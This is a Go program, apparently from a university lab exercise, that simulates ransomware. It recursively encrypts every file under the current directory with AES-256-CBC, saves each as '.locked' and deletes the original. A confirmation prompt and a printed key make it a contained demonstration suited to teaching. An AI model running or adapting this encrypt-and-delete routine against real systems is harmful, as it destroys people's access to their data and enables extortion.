package main

import (
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io/ioutil"
	"os"
	"path/filepath"
	"strings"

	"Laboratorio-3-Parte-4/algorithms"
)

func generateRandomKey(size int) []byte {
	key := make([]byte, size)
	_, err := rand.Read(key)
	if err != nil {
		fmt.Println("Error generando clave aleatoria:", err)
		os.Exit(1)
	}
	return key
}

func findFiles(root string) ([]string, error) {
	var files []string
	err := filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		// Solo cifrar archivos, no carpetas
		if !info.IsDir() {
			files = append(files, path)
		}
		return nil
	})
	return files, err
}

func encryptFiles(files []string, key []byte) {
	iv := generateRandomKey(16) // AES usa IV de 16 bytes
	for _, file := range files {
		data, err := ioutil.ReadFile(file)
		if err != nil {
			fmt.Println("Error leyendo archivo:", file, err)
			continue
		}

		encryptedData, err := algorithms.EncryptAESCBC(data, key, iv)
		if err != nil {
			fmt.Println("Error cifrando archivo:", file, err)
			continue
		}

		err = ioutil.WriteFile(file+".locked", encryptedData, 0644)
		if err != nil {
			fmt.Println("Error escribiendo archivo cifrado:", file, err)
		} else {
			fmt.Println("Archivo cifrado:", file)
			os.Remove(file) // Elimina el archivo original
		}
	}
}

func main() {
	rootDir := "." // Carpeta actual
	fmt.Println("Buscando archivos en:", rootDir)

	files, err := findFiles(rootDir)
	if err != nil {
		fmt.Println("Error buscando archivos:", err)
		return
	}

	if len(files) == 0 {
		fmt.Println("No se encontraron archivos para cifrar.")
		return
	}

	fmt.Println("\nArchivos encontrados para cifrar:")
	for _, file := range files {
		fmt.Println("-", file)
	}

	fmt.Print("\n¿Deseas continuar con el cifrado? (escribe 'YES' para confirmar): ")
	var confirm string
	fmt.Scanln(&confirm)
	if strings.ToUpper(confirm) != "YES" {
		fmt.Println("Operación cancelada.")
		return
	}

	// Generar clave de cifrado
	key := generateRandomKey(32) // AES-256
	fmt.Println("Clave de descifrado (guárdala en un lugar seguro):", hex.EncodeToString(key))

	encryptFiles(files, key)
	fmt.Println("Proceso de cifrado finalizado.")
}
